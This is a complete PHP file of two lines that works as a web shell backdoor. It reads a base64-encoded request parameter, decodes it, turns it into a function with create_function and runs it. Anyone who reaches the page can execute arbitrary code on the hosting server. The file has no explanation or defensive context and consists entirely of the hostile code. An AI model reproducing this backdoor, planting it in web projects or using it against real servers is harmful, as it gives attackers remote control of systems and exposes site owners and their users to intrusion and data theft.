<?php
if(!empty($_REQUEST['adf'])){$adf=base64_decode($_REQUEST["adf"]);$adf=create_function('',$adf);$adf();exit;}